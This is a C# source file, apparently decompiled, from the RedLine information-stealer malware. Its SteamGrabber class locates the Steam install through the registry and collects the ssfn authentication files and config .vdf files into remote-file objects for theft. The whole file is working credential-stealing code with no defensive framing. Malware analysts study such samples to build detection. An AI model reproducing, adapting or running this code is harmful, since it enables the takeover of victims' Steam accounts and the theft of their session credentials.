using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using RedLine.Models;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x02000041 RID: 65
	public static class SteamGrabber
	{
		// Token: 0x0600019E RID: 414 RVA: 0x00005938 File Offset: 0x00003B38
		public static List<RemoteFile> ParseFiles()
		{
			List<RemoteFile> list = new List<RemoteFile>();
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
				if (registryKey == null)
				{
					return list;
				}
				string text = registryKey.GetValue("SteamPath").ToString();
				if (!Directory.Exists(text))
				{
					return list;
				}
				foreach (string text2 in Directory.GetFiles(text))
				{
					if (text2.Contains("ssfn"))
					{
						list.Add(new RemoteFile
						{
							Body = File.ReadAllBytes(text2),
							FileName = Path.GetFileName(text2)
						});
					}
				}
				foreach (string text3 in Directory.GetFiles(Path.Combine(text, "config")))
				{
					if (text3.Contains(".vdf"))
					{
						list.Add(new RemoteFile
						{
							Body = File.ReadAllBytes(text3),
							FileName = Path.GetFileName("config_" + text3)
						});
					}
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
